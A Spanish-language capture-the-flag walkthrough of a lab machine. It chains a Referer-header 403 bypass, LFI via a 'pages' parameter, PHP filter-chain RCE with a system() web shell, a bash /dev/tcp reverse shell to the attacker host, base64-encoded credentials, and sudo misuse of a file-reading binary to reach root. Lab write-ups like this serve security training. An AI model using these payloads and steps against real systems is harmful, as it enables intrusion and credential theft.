
## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 80 | HTTP | Apache httpd 2.4.58 (Ubuntu) |

Un solo puerto abierto. La página por defecto de Apache incluye una pista crucial en el texto:

```
/var/www/bypass403.pw/index.php
```

Ese es el document root real. El servidor tiene un virtual host configurado para `bypass403.pw`.

---

## 2. Virtual host y bypass del 403

```bash
echo "172.17.0.2 bypass403.pw" >> /etc/hosts
```

Al acceder con la IP directamente o sin el header `Referer` correcto, la aplicación devuelve 403. Añadiendo el header:

```bash
curl "http://bypass403.pw" -H "Referer: http://bypass403.pw"
```

La respuesta cambia: la aplicación carga correctamente. El control de acceso estaba basado únicamente en el valor del header `Referer` — cualquier cliente que lo incluya entra sin restricciones.

---

## 3. LFI — descubrimiento del parámetro `pages`

Con ffuf se fuzzan parámetros GET en `index.php`, filtrando por el tamaño de la respuesta sin parámetro (1192 bytes):

```bash
ffuf -u 'http://bypass403.pw/index.php?FUZZ=id' \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -H "Referer: http://bypass403.pw" \
  -fs 1192
```

```
pages   [Status: 200, Size: 0]
```

El parámetro `pages` existe y devuelve 0 bytes con el valor `id` — no ejecuta comandos, pero sí podría incluir archivos. Se prueba con una ruta local:

```bash
curl "http://bypass403.pw/index.php?pages=/etc/passwd" \
  -H "Referer: http://bypass403.pw"
```

```
root:x:0:0:root:/root:/bin/bash
...
bambi:x:1001:1001:bambi,,,:/home/bambi:/bin/bash
```

LFI confirmado. El servidor incluye el archivo directamente. Hay un usuario del sistema: `bambi`.

---

## 4. De LFI a RCE — PHP Filter Chain

El LFI usa `include()` o equivalente de PHP, lo que abre la puerta a la técnica de PHP Filter Chain: se construye una cadena de filtros `php://filter` que genera código PHP arbitrario sin necesidad de escribir ningún archivo en disco.

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

El script genera una URI `php://filter/...` muy larga. Al pasarla como valor del parámetro `pages` junto con el parámetro `cmd`, el servidor ejecuta el comando:

```
GET /index.php?pages=php://filter/[cadena]&cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE como `www-data`. Se lanza una reverse shell URL-encodeada:

```
cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/172.17.0.1/4444%200>%261'
```

Con penelope escuchando en el puerto 4444:

```bash
penelope
```

```
[+] [New Reverse Shell] => 5824cf08f36e 172.17.0.2 • www-data(33)
```

---

## 5. Movimiento lateral a bambi — credenciales en base64

Dentro del home de bambi hay un directorio oculto:

```bash
ls -a /home/bambi
# .bash_history  .bash_logout  .bashrc  .profile  .secret  user.txt
```

```bash
cat /home/bambi/.secret/interestingSecret.txt
```

```
bambi:c3VwZXJzZWNyZXRwYXNzd29yZDEyMw
```

El valor tras los dos puntos es base64:

```bash
echo 'c3VwZXJzZWNyZXRwYXNzd29yZDEyMw==' | base64 -d
# supersecretpassword123
```

```bash
su bambi
# contraseña: supersecretpassword123
```

Estabilización de la terminal:

```bash
script /dev/null -c bash
export TERM=xterm
```

---

## 6. Escalada a root — furb lee archivos como root

```bash
sudo -l
```

```
User bambi may run the following commands on 5824cf08f36e:
    (ALL : ALL) NOPASSWD: /usr/bin/furb
```

El binario `furb` es un comando custom. Se exploran sus opciones:

```bash
/usr/bin/furb --help
# furb --list   List installed items
# furb -r       (requiere argumento: archivo)
```

El flag `-r` lee archivos. Al ejecutarlo con `sudo`, lo hace como root — lo que permite leer cualquier archivo del sistema independientemente de sus permisos:

```bash
sudo /usr/bin/furb -r /root/furbRead.txt
```

```
StrongPasswordRootSuperSecret123
```

```bash
su root
# contraseña: StrongPasswordRootSuperSecret123
```

```bash
root@5824cf08f36e:~# id
uid=0(root) gid=0(root) groups=0(root)

root@5824cf08f36e:~# cat *
StrongPasswordRootSuperSecret123
cded3f7971d8b7ce0b7f57baeb7112fc
```